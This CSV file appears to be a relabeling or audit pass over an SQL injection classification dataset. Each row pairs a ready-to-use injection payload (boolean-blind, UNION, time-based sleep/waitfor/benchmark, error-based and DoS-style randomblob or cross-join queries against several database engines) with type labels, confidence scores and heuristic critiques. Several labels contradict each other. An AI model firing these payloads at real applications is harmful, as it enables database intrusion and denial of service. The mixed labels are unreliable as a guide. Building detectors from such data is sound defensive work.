payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1 where 4372 = 4372,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23210,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 where 4372 = 4372
"-8797"" ) ) order by 1#",boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,23211,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"-8797"" ) ) order by 1#"
"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,23212,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"-9166"" ) as hlre where 4768 = 4768 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --"
1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,23213,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno )
"1' where 2964 = 2964 union all select null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23214,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' where 2964 = 2964 union all select null,null,null#"
"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,23215,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --"
"1' ) ) and elt ( 4460 = 2665,2665 ) and ( ( 'qmzu' = 'qmzu",boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,23216,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) ) and elt ( 4460 = 2665,2665 ) and ( ( 'qmzu' = 'qmzu"
"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23217,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1256' in boolean mode ) union all select 7889,7889,7889,7889,7889,7889,7889,7889,7889--"
select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,23218,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp
"1"" ) as vzdq where 3160 = 3160",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23219,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as vzdq where 3160 = 3160"
"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""mjkl"" = ""mjkl",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,23220,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"1"" ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ""mjkl"" = ""mjkl"
"1"" ) ) order by 1#",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars),heavy_query,oracle,23221,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"1"" ) ) order by 1#"
1' and 4595 = 4595#,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,23222,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1' and 4595 = 4595#
"-4015'|| ( select 'qeqv' from dual where 1437 = 1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,23223,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure,"-4015'|| ( select 'qeqv' from dual where 1437 = 1437 union all select 1437,1437,1437,1437,1437,1437,1437,1437,1437#"
"-7418 union all select 1340,1340,1340,1340,1340#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23224,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7418 union all select 1340,1340,1340,1340,1340#"
1' ) where 6222 = 6222 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,23225,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1' ) where 6222 = 6222 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --
"1"" ) where 7957 = 7957 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.7,like_randomblob,RELABEL,reasoning too short (15 chars),time_blind,sqlite,23226,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" ) where 7957 = 7957 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"-1235"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""ahhz"" like ""ahhz",out_of_band,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,23227,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"-1235"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""ahhz"" like ""ahhz"
"1'+ ( select niht where 7294 = 7294 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23228,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1'+ ( select niht where 7294 = 7294 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23229,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) as tgso where 1349 = 1349 union all select null,null,null,null--"
"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'lwlh' = 'lwlh",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,23230,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'lwlh' = 'lwlh"
"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23231,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""ccuy"" = ""ccuy"
"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""znzb"" like ""znzb",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,23232,boolean_blind,mysql,generic SQL keywords without specific signal,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( ( ""znzb"" like ""znzb"
1' ) where 8142 = 8142 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor,RELABEL,reasoning too short (7 chars),time_blind,mssql,23233,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1' ) where 8142 = 8142 waitfor delay '0:0:5'--
"-1275"" union all select 7861,7861,7861,7861,7861#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23234,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1275"" union all select 7861,7861,7861,7861,7861#"
"1"" ) ) ) and elt ( 2421 = 9612,9612 ) and ( ( ( ""gbdx"" like ""gbdx",boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,23235,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" ) ) ) and elt ( 2421 = 9612,9612 ) and ( ( ( ""gbdx"" like ""gbdx"
"1%' ) ) union all select null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23236,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) union all select null,null,null,null,null--"
select ( case when ( 9376 = 4521 ) then 1 else 9376* ( select 9376 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,mssql,23237,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 9376 = 4521 ) then 1 else 9376* ( select 9376 from master..sysdatabases ) end ) --
"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'atyf' = 'atyf",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23238,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'atyf' = 'atyf"
"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23239,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#"
"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # miji",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23240,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # miji"
1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'ajka' = 'ajka,out_of_band,oracle,0.9,xmltype_error,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,23241,error_based,oracle,Pattern match: 'xmltype (' → error_based (P4); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( 'ajka' = 'ajka
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,23242,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )"
"1'+ ( select bptu where 7356 = 7356 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,23243,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1'+ ( select bptu where 7356 = 7356 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'"
"1%' ) union all select null,null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23244,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) union all select null,null,null,null,null,null,null--"
end-- elvi,boolean_blind,generic,0.5,end_and,RELABEL,reasoning too short (7 chars); confidence too low (0.50),boolean_blind,generic,23245,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,end-- elvi
"-6987' union all select 4721,4721--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23246,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6987' union all select 4721,4721--"
"-5360' where 8178 = 8178 union all select 8178,8178,8178--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,23247,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5360' where 8178 = 8178 union all select 8178,8178,8178--"
"1"" and ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,23248,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1"" and ( 3020 = 3020 ) *6703 and ""tnzp"" like ""tnzp"
"-8875"" ) where 8428 = 8428 or 1519 = 5756--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,23249,boolean_blind,generic,Pattern match: 'or 1519 = 5756' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-8875"" ) where 8428 = 8428 or 1519 = 5756--"
1 ) ) as xzcl where 2332 = 2332,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,23250,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) ) as xzcl where 2332 = 2332
1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'rgyc' = 'rgyc,heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,23251,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'rgyc' = 'rgyc
"-5520"" ) ) as utqk where 7762 = 7762 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",out_of_band,oracle,0.9,ctxsys_drithsx,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,23252,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-5520"" ) ) as utqk where 7762 = 7762 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"
"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,oracle,23253,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,"1'|| ( select 'wcad' from dual where 4262 = 4262 and elt ( 3114 = 3114,sleep ( 5 ) ) #"
-9771' or 5113 = 5365,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,23254,boolean_blind,generic,Pattern match: 'or 5113 = 5365' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-9771' or 5113 = 5365
"1', ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,23255,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1', ( select ( case when ( 7734 = 7734 ) then ( select benchmark ( 5000000,md5 ( 0x72747341 ) ) ) else 7734* ( select 7734 from mysql.db ) end ) )"
